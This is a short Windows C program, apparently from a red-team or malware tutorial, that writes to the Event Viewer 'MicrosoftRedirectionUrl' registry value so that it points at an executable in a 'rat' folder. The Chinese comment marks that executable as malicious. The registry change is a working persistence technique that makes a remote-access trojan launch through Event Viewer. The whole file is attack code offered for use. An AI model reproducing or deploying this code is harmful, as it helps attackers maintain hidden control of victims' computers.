#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  const char* app = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer";

  //恶意可执行程序路径
  const char* exe = "file://C:\\Users\\snowwolf\\Desktop\\rat\\pre\\wolf.exe";

  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"MicrosoftRedirectionUrl", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
